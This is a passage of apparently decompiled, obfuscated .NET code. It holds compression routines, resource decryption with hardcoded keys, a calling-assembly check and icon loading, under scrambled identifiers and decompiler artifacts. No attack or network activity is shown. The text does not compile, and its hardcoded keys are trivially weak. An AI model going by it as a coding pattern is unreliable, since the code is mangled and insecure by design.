          (object) *(int*) ((IntPtr) voidPtr + 8),
          (object) *(int*) ((IntPtr) voidPtr + 12),
          (object) *(int*) ((IntPtr) voidPtr + 16),
          (object) *(byte*) ((IntPtr) voidPtr + 20),
          (object) *(byte*) ((IntPtr) voidPtr + 21),
          (object) obj1,
          (object) obj0
        };
        \u0006.\u0007.\u0001(ex, objArray);
        throw;
      }
      return (bool) *(sbyte*) ((IntPtr) voidPtr + 22);
    }

    static int \u0001([In] \u0003.\u0004.\u000E obj0, [In] byte[] obj1, [In] int obj2, [In] int obj3)
    {
      int num1;
      try
      {
        if (obj0.\u0003 >= 8)
        {
          byte[] numArray = obj0.\u0001;
          \u0003.\u0004.\u000E obj = obj0;
          int num2;
          num1 = num2 = obj.\u0002;
          obj.\u0002 = num2 + 1;
          int index = num1;
          int num3 = (int) (byte) obj0.\u0001;
          numArray[index] = (byte) num3;
          obj0.\u0001 >>= 8;
          obj0.\u0003 -= 8;
        }
        if (obj3 <= obj0.\u0002 - obj0.\u0001)
        {
          Array.Copy((Array) obj0.\u0001, obj0.\u0001, (Array) obj1, obj2, obj3);
          obj0.\u0001 += obj3;
        }
        else
          goto label_5;
label_2:
        return obj3;
label_5:
        obj3 = obj0.\u0002 - obj0.\u0001;
        Array.Copy((Array) obj0.\u0001, obj0.\u0001, (Array) obj1, obj2, obj3);
        obj0.\u0001 = 0;
        obj0.\u0002 = 0;
        goto label_2;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) num1;
        \u0003.\u0004.\u000E obj = obj0;
        byte[] numArray = obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) obj3;
        \u0006.\u0007.\u0001(ex, (object) local1, (object) obj, (object) numArray, (object) local2, (object) local3);
        throw;
      }
    }

    static void \u0001([In] \u0001 obj0, [In] string obj1)
    {
      try
      {
        do
        {
          \u0006.\u0007.\u0001(obj0, \u0006.\u0007.\u0001(ref obj1, obj0));
        }
        while (false);
      }
      catch (Exception ex)
      {
        \u0001 obj = obj0;
        string str = obj1;
        \u0006.\u0007.\u0001(ex, (object) obj, (object) str);
        throw;
      }
    }

    static unsafe bool \u0001([In] bool obj0, [In] bool obj1, [In] \u0003.\u0004.\u0008 obj2)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(2);
      bool flag;
      try
      {
        do
        {
          \u0006.\u0007.\u0001(obj2);
          flag = obj1 && obj2.\u0008 == obj2.\u000E;
          *(sbyte*) voidPtr = (sbyte) \u0006.\u0007.\u0001(flag, obj0, obj2);
        }
        while (\u0006.\u0007.\u0001(obj2.\u0001) && *(sbyte*) voidPtr != (sbyte) 0);
        *(sbyte*) ((IntPtr) voidPtr + 1) = *(sbyte*) voidPtr;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<bool> local1 = (ValueType) (bool) *(sbyte*) voidPtr;
        // ISSUE: variable of a boxed type
        __Boxed<bool> local2 = (ValueType) flag;
        \u0003.\u0004.\u0008 obj = obj2;
        // ISSUE: variable of a boxed type
        __Boxed<bool> local3 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<bool> local4 = (ValueType) obj0;
        \u0006.\u0007.\u0001(ex, (object) local1, (object) local2, (object) obj, (object) local3, (object) local4);
        throw;
      }
      return (bool) *(sbyte*) ((IntPtr) voidPtr + 1);
    }

    static void \u0001([In] \u0003.\u0004.\u000E obj0, [In] int obj1)
    {
      int num1;
      try
      {
        byte[] numArray1 = obj0.\u0001;
        \u0003.\u0004.\u000E obj2 = obj0;
        int num2;
        num1 = num2 = obj2.\u0002;
        obj2.\u0002 = num2 + 1;
        int index1 = num1;
        int num3 = (int) (byte) obj1;
        numArray1[index1] = (byte) num3;
        byte[] numArray2 = obj0.\u0001;
        \u0003.\u0004.\u000E obj3 = obj0;
        int num4;
        num1 = num4 = obj3.\u0002;
        obj3.\u0002 = num4 + 1;
        int index2 = num1;
        int num5 = (int) (byte) (obj1 >> 8);
        numArray2[index2] = (byte) num5;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) num1;
        \u0003.\u0004.\u000E obj = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) obj1;
        \u0006.\u0007.\u0001(ex, (object) local1, (object) obj, (object) local2);
        throw;
      }
    }

    static bool \u0001([In] \u0003.\u0005 obj0) => obj0.\u0003;

    static void \u0001([In] ThreadStart obj0, [In] \u0002.\u0007 obj1)
    {
      obj1.\u0001 = new Thread(obj0);
      \u009B.\u007E\u0084\u0003((object) obj1.\u0001);
    }

    static Icon \u0001([In] string obj0)
    {
      Icon icon1;
      try
      {
        Stream stream;
        if (true)
        {
          stream = \u0098.\u007E\u001C\u0003((object) \u0097.\u001B\u0003(), global::\u0004.\u0004(\u0006.\u0007.\u001F(2636), obj0, \u0006.\u0007.\u001F(2697)));
          if (stream == null)
            goto label_4;
        }
        Icon icon2;
        if (true)
        {
          if (true)
          {
            icon2 = new Icon(stream);
            goto label_5;
          }
        }
        else
          goto label_8;
label_4:
        icon2 = (Icon) null;
label_5:
        icon1 = icon2;
      }
      catch
      {
        icon1 = (Icon) null;
      }
label_8:
      return icon1;
    }

    static bool \u0001([In] \u0001 obj0) => obj0.\u0003;

    static unsafe void \u0001([In] \u0003.\u0004.\u0007.\u0001 obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(16);
      int[] numArray1;
      int[] numArray2;
      IntPtr index;
      try
      {
        int length = obj0.\u0001.Length;
        numArray1 = new int[obj0.\u0003];
        *(int*) voidPtr = 0;
        obj0.\u0002 = new short[obj0.\u0001.Length];
        *(int*) ((IntPtr) voidPtr + 4) = 0;
        while (*(int*) ((IntPtr) voidPtr + 4) < obj0.\u0003)
        {
          numArray1[*(int*) ((IntPtr) voidPtr + 4)] = *(int*) voidPtr;
          *(int*) voidPtr = *(int*) voidPtr + (obj0.\u0001[*(int*) ((IntPtr) voidPtr + 4)] << 15 - *(int*) ((IntPtr) voidPtr + 4));
          *(int*) ((IntPtr) voidPtr + 4) = *(int*) ((IntPtr) voidPtr + 4) + 1;
        }
        *(int*) ((IntPtr) voidPtr + 8) = 0;
        while (true)
        {
          int num1 = *(int*) ((IntPtr) voidPtr + 8);
          int num2 = obj0.\u0002;
          if (true)
            goto label_9;
label_5:
          if (num1 > num2)
          {
            obj0.\u0002[*(int*) ((IntPtr) voidPtr + 8)] = \u0006.\u0007.\u0001(numArray1[*(int*) ((IntPtr) voidPtr + 12) - 1]);
            (numArray2 = numArray1)[(int) (index = (IntPtr) (*(int*) ((IntPtr) voidPtr + 12) - 1))] = numArray2[index] + (1 << 16 - *(int*) ((IntPtr) voidPtr + 12));
          }
          *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 8) + 1;
          continue;
label_9:
          if (num1 < num2)
          {
            *(int*) ((IntPtr) voidPtr + 12) = (int) obj0.\u0001[*(int*) ((IntPtr) voidPtr + 8)];
            int num3 = *(int*) ((IntPtr) voidPtr + 12);
            num2 = 0;
            num1 = num3;
            goto label_5;
          }
          else
            break;
        }
      }
      catch (Exception ex)
      {
        int[] numArray3 = numArray1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) *(int*) voidPtr;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) *(int*) ((IntPtr) voidPtr + 4);
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) *(int*) ((IntPtr) voidPtr + 8);
        // ISSUE: variable of a boxed type
        __Boxed<int> local4 = (ValueType) *(int*) ((IntPtr) voidPtr + 12);
        int[] numArray4 = numArray2;
        // ISSUE: variable of a boxed type
        __Boxed<IntPtr> local5 = (ValueType) index;
        \u0003.\u0004.\u0007.\u0001 obj = obj0;
        \u0006.\u0007.\u0001(ex, (object) numArray3, (object) local1, (object) local2, (object) local3, (object) local4, (object) numArray4, (object) local5, (object) obj);
        throw;
      }
    }

    static \u000E.\u0002 \u0001([In] \u0004.\u0007 obj0) => obj0.\u0001;

    static bool \u0001([In] \u0003.\u0005 obj0) => obj0.\u0002 && obj0.\u0001.\u0001();

    static unsafe int \u0001([In] \u0003.\u0004.\u0008 obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(8);
      short num1;
      try
      {
        *(int*) voidPtr = (obj0.\u0001 << 5 ^ (int) obj0.\u0001[obj0.\u0005 + 2]) & (int) short.MaxValue;
        short[] numArray1 = obj0.\u0002;
        int index1 = obj0.\u0005 & (int) short.MaxValue;
        short[] numArray2 = obj0.\u0001;
        int index2 = *(int*) voidPtr;
        int num2;
        num1 = (short) (num2 = (int) numArray2[index2]);
        numArray1[index1] = (short) num2;
        obj0.\u0001[*(int*) voidPtr] = (short) obj0.\u0005;
        obj0.\u0001 = *(int*) voidPtr;
        *(int*) ((IntPtr) voidPtr + 4) = (int) num1 & (int) ushort.MaxValue;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<short> local1 = (ValueType) num1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) *(int*) voidPtr;
        \u0003.\u0004.\u0008 obj = obj0;
        \u0006.\u0007.\u0001(ex, (object) local1, (object) local2, (object) obj);
        throw;
      }
      return *(int*) ((IntPtr) voidPtr + 4);
    }

    static void \u0001([In] \u0002.\u0004 obj0, [In] \u0002.\u0005 obj1)
    {
      if (obj0.\u0001 == obj1)
        return;
      obj0.\u0001 = obj1;
      switch (obj0.\u0001)
      {
        case \u0002.\u0005.\u0002:
          obj0.\u0001 = \u0006.\u0007.\u0001(\u0006.\u0007.\u001F(2706));
          break;
        case \u0002.\u0005.\u0003:
          obj0.\u0001 = \u0006.\u0007.\u0001(\u0006.\u0007.\u001F(2719));
          break;
        default:
          obj0.\u0001 = (Bitmap) null;
          break;
      }
      \u009B.\u007E\u0083\u0003((object) obj0);
    }

    static void \u0001(
      [In] Exception obj0,
      [In] object obj1,
      [In] object obj2,
      [In] object obj3,
      [In] object obj4,
      [In] object obj5,
      [In] object obj6,
      [In] object obj7,
      [In] object obj8,
      [In] object obj9,
      [In] object obj10)
    {
      \u0006.\u0007.\u0001(obj0, new object[10]
      {
        obj1,
        obj2,
        obj3,
        obj4,
        obj5,
        obj6,
        obj7,
        obj8,
        obj9,
        obj10
      });
    }

    static void \u0001([In] string obj0, [In] \u0001 obj1)
    {
      char[] chArray1;
      object[] objArray1;
      object[] objArray2;
      object[] objArray3;
      bool[] flagArray1;
      Exception exception1;
      try
      {
        try
        {
          \u0011 obj2 = \u0011.\u001A;
          \u0001 obj3 = \u0001.\u0001;
          object obj4 = \u0001.\u0001(\u0001.\u0001(obj1.\u0004, (System.Type) null, \u0006.\u0007.\u001F(795), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, \u0006.\u0007.\u001F(856), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null);
          string str1 = \u0006.\u0007.\u001F(1035);
          object[] objArray4 = new object[1];
          if (true)
            objArray1 = objArray4;
          object[] objArray5 = objArray1;
          chArray1 = new char[9]
          {
            'S',
            'o',
            'f',
            't',
            'w',
            'a',
            'r',
            'e',
            '\\'
          };
          string str2 = \u001D.\u0099(new string(chArray1), obj1.\u0006);
          objArray5[0] = (object) str2;
          object[] objArray6 = objArray1;
          object obj5 = obj3(obj4, (System.Type) null, str1, objArray6, (string[]) null, (System.Type[]) null, (bool[]) null);
          string str3 = \u0006.\u0007.\u001F(2539);
          objArray2 = new object[1]{ (object) obj0 };
          objArray3 = objArray2;
          object[] objArray7 = objArray3;
          flagArray1 = new bool[1]{ true };
          bool[] flagArray2 = flagArray1;
          object obj6 = obj2(obj5, (System.Type) null, str3, objArray7, (string[]) null, (System.Type[]) null, flagArray2, true);
          if (!flagArray1[0])
            return;
          // ISSUE: type reference
          obj0 = (string) \u0014.\u001D(\u0012.\u001B(objArray3[0]), \u0013.\u001C(__typeref (string)));
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          exception1 = ex;
          global::\u0006.\u0006();
        }
      }
      catch (Exception ex)
      {
        Exception exception2 = exception1;
        char[] chArray2 = chArray1;
        object[] objArray8 = objArray1;
        object[] objArray9 = objArray2;
        object[] objArray10 = objArray3;
        bool[] flagArray3 = flagArray1;
        \u0001 obj = obj1;
        string str = obj0;
        \u0006.\u0007.\u0001(ex, (object) exception2, (object) chArray2, (object) objArray8, (object) objArray9, (object) objArray10, (object) flagArray3, (object) obj, (object) str);
        throw;
      }
    }

    static Bitmap \u0001([In] string obj0)
    {
      Bitmap bitmap1;
      try
      {
        Stream stream;
        if (true)
        {
          stream = \u0098.\u007E\u001C\u0003((object) \u0097.\u001B\u0003(), global::\u0004.\u0004(\u0006.\u0007.\u001F(2636), obj0, \u0006.\u0007.\u001F(2732)));
          if (stream == null)
            goto label_4;
        }
        Bitmap bitmap2;
        if (true)
        {
          if (true)
          {
            bitmap2 = new Bitmap(stream);
            goto label_5;
          }
        }
        else
          goto label_8;
label_4:
        bitmap2 = (Bitmap) null;
label_5:
        bitmap1 = bitmap2;
      }
      catch
      {
        bitmap1 = (Bitmap) null;
      }
label_8:
      return bitmap1;
    }

    static \u0003.\u0004.\u0004 \u0001([In] \u0003.\u0004.\u0005 obj0)
    {
      byte[] destinationArray;
      try
      {
        do
        {
          destinationArray = new byte[obj0.\u0002];
        }
        while (false);
        Array.Copy((Array) obj0.\u0002, 0, (Array) destinationArray, 0, obj0.\u0002);
        return new \u0003.\u0004.\u0004(destinationArray);
      }
      catch (Exception ex)
      {
        byte[] numArray = destinationArray;
        \u0003.\u0004.\u0005 obj = obj0;
        \u0006.\u0007.\u0001(ex, (object) numArray, (object) obj);
        throw;
      }
    }

    static unsafe byte[] \u0001([In] byte[] obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(46);
      \u0003.\u0004.\u000F obj1;
      byte[] numArray1;
      byte[] buffer1;
      byte[] buffer2;
      byte[] buffer3;
      \u0003.\u0004.\u0001 obj2;
      byte[] buffer4;
      \u0003.\u0004.\u0001 obj3;
      byte[] numArray2;
      byte[] numArray3;
      \u0006.\u0004 obj4;
      ICryptoTransform cryptoTransform1;
      byte[] numArray4;
      byte[] numArray5;
      byte[] numArray6;
      \u0003.\u0003 obj5;
      ICryptoTransform cryptoTransform2;
      byte[] numArray7;
      Assembly callingAssembly;
      Assembly executingAssembly;
      try
      {
        callingAssembly = Assembly.GetCallingAssembly();
        executingAssembly = Assembly.GetExecutingAssembly();
        if ((object) callingAssembly != (object) executingAssembly && !\u0006.\u0007.\u0001(callingAssembly, executingAssembly))
          return (byte[]) null;
        obj1 = new \u0003.\u0004.\u000F(obj0);
        numArray1 = new byte[0];
        *(int*) voidPtr = \u0006.\u0007.\u0001(obj1);
        if (*(int*) voidPtr == 67324752)
        {
          *(short*) ((IntPtr) voidPtr + 44) = (short) \u0006.\u0007.\u0001(obj1);
          *(int*) ((IntPtr) voidPtr + 4) = \u0006.\u0007.\u0001(obj1);
          *(int*) ((IntPtr) voidPtr + 8) = \u0006.\u0007.\u0001(obj1);
          if (*(int*) voidPtr != 67324752 || *(short*) ((IntPtr) voidPtr + 44) != (short) 20 || *(int*) ((IntPtr) voidPtr + 4) != 0 || *(int*) ((IntPtr) voidPtr + 8) != 8)
            throw new FormatException("Wrong Header Signature");
          \u0006.\u0007.\u0001(obj1);
          \u0006.\u0007.\u0001(obj1);
          \u0006.\u0007.\u0001(obj1);
          *(int*) ((IntPtr) voidPtr + 12) = \u0006.\u0007.\u0001(obj1);
          *(int*) ((IntPtr) voidPtr + 16) = \u0006.\u0007.\u0001(obj1);
          *(int*) ((IntPtr) voidPtr + 20) = \u0006.\u0007.\u0001(obj1);
          if (*(int*) ((IntPtr) voidPtr + 16) > 0)
          {
            buffer1 = new byte[*(int*) ((IntPtr) voidPtr + 16)];
            obj1.Read(buffer1, 0, *(int*) ((IntPtr) voidPtr + 16));
          }
          if (*(int*) ((IntPtr) voidPtr + 20) > 0)
          {
            buffer2 = new byte[*(int*) ((IntPtr) voidPtr + 20)];
            obj1.Read(buffer2, 0, *(int*) ((IntPtr) voidPtr + 20));
          }
          buffer3 = new byte[obj1.Length - obj1.Position];
          obj1.Read(buffer3, 0, buffer3.Length);
          obj2 = new \u0003.\u0004.\u0001(buffer3);
          numArray1 = new byte[*(int*) ((IntPtr) voidPtr + 12)];
          \u0006.\u0007.\u0001(numArray1.Length, 0, obj2, numArray1);
          buffer3 = (byte[]) null;
        }
        else
        {
          *(int*) ((IntPtr) voidPtr + 24) = *(int*) voidPtr >> 24;
          *(int*) voidPtr = *(int*) voidPtr - (*(int*) ((IntPtr) voidPtr + 24) << 24);
          if (*(int*) voidPtr != 8223355)
            throw new FormatException("Unknown Header");
          if (*(int*) ((IntPtr) voidPtr + 24) == 1)
          {
            *(int*) ((IntPtr) voidPtr + 28) = \u0006.\u0007.\u0001(obj1);
            numArray1 = new byte[*(int*) ((IntPtr) voidPtr + 28)];
            *(int*) ((IntPtr) voidPtr + 32) = 0;
            while (*(int*) ((IntPtr) voidPtr + 32) < *(int*) ((IntPtr) voidPtr + 28))
            {
              *(int*) ((IntPtr) voidPtr + 36) = \u0006.\u0007.\u0001(obj1);
              *(int*) ((IntPtr) voidPtr + 40) = \u0006.\u0007.\u0001(obj1);
              buffer4 = new byte[*(int*) ((IntPtr) voidPtr + 36)];
              obj1.Read(buffer4, 0, buffer4.Length);
              obj3 = new \u0003.\u0004.\u0001(buffer4);
              \u0006.\u0007.\u0001(*(int*) ((IntPtr) voidPtr + 40), *(int*) ((IntPtr) voidPtr + 32), obj3, numArray1);
              *(int*) ((IntPtr) voidPtr + 32) = *(int*) ((IntPtr) voidPtr + 32) + *(int*) ((IntPtr) voidPtr + 40);
            }
          }
          if (*(int*) ((IntPtr) voidPtr + 24) == 2)
          {
            numArray2 = new byte[8]
            {
              (byte) 249,
              (byte) 184,
              (byte) 80,
              (byte) 200,
              (byte) 126,
              (byte) 208,
              (byte) 34,
              (byte) 230
            };
            numArray3 = new byte[8]
            {
              (byte) 75,
              (byte) 96,
              (byte) 12,
              (byte) 85,
              (byte) 187,
              (byte) 152,
              (byte) 113,
              (byte) 118
            };
            obj4 = new \u0006.\u0004();
            try
            {
              cryptoTransform1 = \u0006.\u0007.\u0001(true, numArray2, obj4, numArray3);
              try
              {
                numArray4 = cryptoTransform1.TransformFinalBlock(obj0, 4, obj0.Length - 4);
                numArray1 = \u0006.\u0007.\u0001(numArray4);
              }
              finally
              {
                cryptoTransform1?.Dispose();
              }
            }
            finally
            {
              ((IDisposable) obj4)?.Dispose();
            }
          }
          if (*(int*) ((IntPtr) voidPtr + 24) == 3)
          {
            numArray5 = new byte[16]
            {
              (byte) 1,
              (byte) 1,
              (byte) 1,
              (byte) 1,
              (byte) 1,
              (byte) 1,
              (byte) 1,
              (byte) 1,
              (byte) 1,
              (byte) 1,
              (byte) 1,
              (byte) 1,
              (byte) 1,
              (byte) 1,
              (byte) 1,
              (byte) 1
            };
            numArray6 = new byte[16]
            {
              (byte) 2,
              (byte) 2,
              (byte) 2,
              (byte) 2,
              (byte) 2,
              (byte) 2,
              (byte) 2,
              (byte) 2,
              (byte) 2,
              (byte) 2,
              (byte) 2,
              (byte) 2,
              (byte) 2,
              (byte) 2,
              (byte) 2,
              (byte) 2
            };
            obj5 = new \u0003.\u0003();
            try
            {
              cryptoTransform2 = \u0006.\u0007.\u0001(numArray6, obj5, true, numArray5);
              try
              {
                numArray7 = cryptoTransform2.TransformFinalBlock(obj0, 4, obj0.Length - 4);
                numArray1 = \u0006.\u0007.\u0001(numArray7);
              }
              finally
              {
                cryptoTransform2?.Dispose();
              }
            }
            finally
            {
              ((IDisposable) obj5)?.Dispose();
            }
          }
        }
        obj1.Close();
        return numArray1;
      }
      catch (Exception ex)
      {
        object[] objArray = new object[33]
        {
          (object) callingAssembly,
          (object) executingAssembly,
          (object) obj1,
          (object) numArray1,
          (object) *(int*) voidPtr,
          (object) *(short*) ((IntPtr) voidPtr + 44),
          (object) *(int*) ((IntPtr) voidPtr + 4),
          (object) *(int*) ((IntPtr) voidPtr + 8),
          (object) *(int*) ((IntPtr) voidPtr + 12),
          (object) *(int*) ((IntPtr) voidPtr + 16),
          (object) *(int*) ((IntPtr) voidPtr + 20),
          (object) buffer1,
          (object) buffer2,
          (object) buffer3,
          (object) obj2,
          (object) *(int*) ((IntPtr) voidPtr + 24),
          (object) *(int*) ((IntPtr) voidPtr + 28),
          (object) *(int*) ((IntPtr) voidPtr + 32),
          (object) *(int*) ((IntPtr) voidPtr + 36),
          (object) *(int*) ((IntPtr) voidPtr + 40),
          (object) obj3,
          (object) buffer4,
          (object) numArray2,
          (object) numArray3,
          (object) obj4,
          (object) cryptoTransform1,
          (object) numArray4,
          (object) numArray5,
          (object) numArray6,
          (object) obj5,
          (object) cryptoTransform2,
          (object) numArray7,
          (object) obj0
        };
        \u0006.\u0007.\u0001(ex, objArray);
        throw;
      }
    }

    static unsafe bool \u0001([In] bool obj0, [In] bool obj1, [In] \u0003.\u0004.\u0008 obj2)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(25);
      int num;
      bool flag;
      try
      {
        if (obj2.\u0006 >= 262 || obj0)
        {
          while (obj2.\u0006 >= 262 || obj0)
          {
            if (obj2.\u0006 != 0)
            {
              if (obj2.\u0005 >= 65274)
                \u0006.\u0007.\u0001(obj2);
              *(int*) voidPtr = obj2.\u0002;
              num = obj2.\u0003;
              if (obj2.\u0006 >= 3)
              {
                *(int*) ((IntPtr) voidPtr + 4) = \u0006.\u0007.\u0001(obj2);
                if (*(int*) ((IntPtr) voidPtr + 4) != 0 && obj2.\u0005 - *(int*) ((IntPtr) voidPtr + 4) <= 32506 && \u0006.\u0007.\u0001(*(int*) ((IntPtr) voidPtr + 4), obj2) && obj2.\u0003 <= 5 && obj2.\u0003 == 3 && obj2.\u0005 - obj2.\u0002 > 4096)
                  obj2.\u0003 = 2;
              }
              if (num >= 3 && obj2.\u0003 <= num)
              {
                \u0003.\u0004.\u0007 obj = obj2.\u0001;
                *(int*) ((IntPtr) voidPtr + 16) = obj2.\u0005 - 1 - *(int*) voidPtr;
                \u0006.\u0007.\u0001(num, *(int*) ((IntPtr) voidPtr + 16), obj);
                num -= 2;
                do
                {
                  ++obj2.\u0005;
                  --obj2.\u0006;
                  if (obj2.\u0006 >= 3)
                    \u0006.\u0007.\u0001(obj2);
                }
                while (--num > 0);
                ++obj2.\u0005;
                --obj2.\u0006;
                obj2.\u0001 = false;
                obj2.\u0003 = 2;
              }
              else
              {
                if (obj2.\u0001)
                  \u0006.\u0007.\u0001(obj2.\u0001, (int) obj2.\u0001[obj2.\u0005 - 1] & (int) byte.MaxValue);
                obj2.\u0001 = true;
                ++obj2.\u0005;
                --obj2.\u0006;
              }
              if (\u0006.\u0007.\u0001(obj2.\u0001))
              {
                *(int*) ((IntPtr) voidPtr + 8) = obj2.\u0005 - obj2.\u0004;
                if (obj2.\u0001)
                  *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 8) - 1;
                flag = obj1 && obj2.\u0006 == 0 && !obj2.\u0001;
                \u0003.\u0004.\u0007 obj = obj2.\u0001;
                byte[] numArray = obj2.\u0001;
                *(int*) ((IntPtr) voidPtr + 12) = obj2.\u0004;
                \u0006.\u0007.\u0001(*(int*) ((IntPtr) voidPtr + 8), obj, numArray, flag, *(int*) ((IntPtr) voidPtr + 12));
                obj2.\u0004 += *(int*) ((IntPtr) voidPtr + 8);
                *(sbyte*) ((IntPtr) voidPtr + 24) = (sbyte) !flag;
                goto label_28;
              }
            }
            else
            {
              if (obj2.\u0001)
                goto label_26;
label_2:
              obj2.\u0001 = false;
              \u0003.\u0004.\u0007 obj = obj2.\u0001;
              byte[] numArray = obj2.\u0001;
              *(int*) ((IntPtr) voidPtr + 12) = obj2.\u0004;
              *(int*) ((IntPtr) voidPtr + 20) = obj2.\u0005 - obj2.\u0004;
              \u0006.\u0007.\u0001(*(int*) ((IntPtr) voidPtr + 20), obj, numArray, obj1, *(int*) ((IntPtr) voidPtr + 12));
              obj2.\u0004 = obj2.\u0005;
              *(sbyte*) ((IntPtr) voidPtr + 24) = (sbyte) 0;
              goto label_28;
label_26:
              \u0006.\u0007.\u0001(obj2.\u0001, (int) obj2.\u0001[obj2.\u0005 - 1] & (int) byte.MaxValue);
              goto label_2;
            }
          }
          *(sbyte*) ((IntPtr) voidPtr + 24) = (sbyte) 1;
        }
        else
          *(sbyte*) ((IntPtr) voidPtr + 24) = (sbyte) 0;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) *(int*) voidPtr;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) num;
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) *(int*) ((IntPtr) voidPtr + 4);
        // ISSUE: variable of a boxed type
        __Boxed<int> local4 = (ValueType) *(int*) ((IntPtr) voidPtr + 8);
        // ISSUE: variable of a boxed type
        __Boxed<bool> local5 = (ValueType) flag;
        \u0003.\u0004.\u0008 obj = obj2;
        // ISSUE: variable of a boxed type
        __Boxed<bool> local6 = (ValueType) obj0;
        // ISSUE: variable of a boxed type
        __Boxed<bool> local7 = (ValueType) obj1;
        \u0006.\u0007.\u0001(ex, (object) local1, (object) local2, (object) local3, (object) local4, (object) local5, (object) obj, (object) local6, (object) local7);
        throw;
      }
label_28:
      return (bool) *(sbyte*) ((IntPtr) voidPtr + 24);
    }

    static void \u0001([In] Exception obj0, [In] object obj1, [In] object obj2) => \u0006.\u0007.\u0001(obj0, new object[2]
    {
      obj1,
      obj2
    });

    static byte[] \u0001([In] byte[] obj0)
    {
      byte[] numArray1;
      try
      {
        numArray1 = \u0006.\u0007.\u0001((byte[]) null, obj0, (byte[]) null, 1);
      }
      catch (Exception ex)
      {
        byte[] numArray2 = obj0;
        \u0006.\u0007.\u0001(ex, (object) numArray2);
        throw;
      }
      return numArray1;
    }

    [DllImport("user32", EntryPoint = "DrawText", CharSet = CharSet.Unicode)]
    static extern int \u0001(
      [In] IntPtr obj0,
      [In] string obj1,
      [In] int obj2,
      [In] ref \u0007.\u0003.\u0001 obj3,
      [In] int obj4);

    static unsafe void \u0001([In] int obj0, [In] \u0003.\u0004.\u0007 obj1, [In] byte[] obj2, [In] bool obj3, [In] int obj4)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(24);
      short[] numArray1;
      try
      {
        (numArray1 = obj1.\u0001.\u0001)[256] = (short) ((int) numArray1[256] + 1);
        \u0006.\u0007.\u0001(obj1.\u0001);
        \u0006.\u0007.\u0001(obj1.\u0002);
        \u0003.\u0004.\u0007.\u0001 obj5 = obj1.\u0001;
        \u0006.\u0007.\u0001(obj1.\u0003, obj5);
        \u0003.\u0004.\u0007.\u0001 obj6 = obj1.\u0002;
        \u0006.\u0007.\u0001(obj1.\u0003, obj6);
        \u0006.\u0007.\u0001(obj1.\u0003);
        *(int*) voidPtr = 4;
        *(int*) ((IntPtr) voidPtr + 4) = 18;
        while (*(int*) ((IntPtr) voidPtr + 4) > *(int*) voidPtr)
        {
          if (obj1.\u0003.\u0001[\u0003.\u0004.\u0007.\u0001[*(int*) ((IntPtr) voidPtr + 4)]] > (byte) 0)
            *(int*) voidPtr = *(int*) ((IntPtr) voidPtr + 4) + 1;
          *(int*) ((IntPtr) voidPtr + 4) = *(int*) ((IntPtr) voidPtr + 4) - 1;
        }
        *(int*) ((IntPtr) voidPtr + 8) = 14 + *(int*) voidPtr * 3 + \u0006.\u0007.\u0001(obj1.\u0003) + \u0006.\u0007.\u0001(obj1.\u0001) + \u0006.\u0007.\u0001(obj1.\u0002) + obj1.\u0002;
        *(int*) ((IntPtr) voidPtr + 12) = obj1.\u0002;
        *(int*) ((IntPtr) voidPtr + 16) = 0;
        while (*(int*) ((IntPtr) voidPtr + 16) < 286)
        {
          *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 12) + (int) obj1.\u0001.\u0001[*(int*) ((IntPtr) voidPtr + 16)] * (int) \u0003.\u0004.\u0007.\u0003[*(int*) ((IntPtr) voidPtr + 16)];
          *(int*) ((IntPtr) voidPtr + 16) = *(int*) ((IntPtr) voidPtr + 16) + 1;
        }
        *(int*) ((IntPtr) voidPtr + 20) = 0;
        while (*(int*) ((IntPtr) voidPtr + 20) < 30)
        {
          *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 12) + (int) obj1.\u0002.\u0001[*(int*) ((IntPtr) voidPtr + 20)] * (int) \u0003.\u0004.\u0007.\u0004[*(int*) ((IntPtr) voidPtr + 20)];
          *(int*) ((IntPtr) voidPtr + 20) = *(int*) ((IntPtr) voidPtr + 20) + 1;
        }
        if (*(int*) ((IntPtr) voidPtr + 8) >= *(int*) ((IntPtr) voidPtr + 12))
          *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 12);
        if (obj4 >= 0 && obj0 + 4 < *(int*) ((IntPtr) voidPtr + 8) >> 3)
          \u0006.\u0007.\u0001(obj0, obj1, obj2, obj4, obj3);
        else if (*(int*) ((IntPtr) voidPtr + 8) == *(int*) ((IntPtr) voidPtr + 12))
        {
          \u0006.\u0007.\u0001(obj1.\u0001, 2 + (obj3 ? 1 : 0), 3);
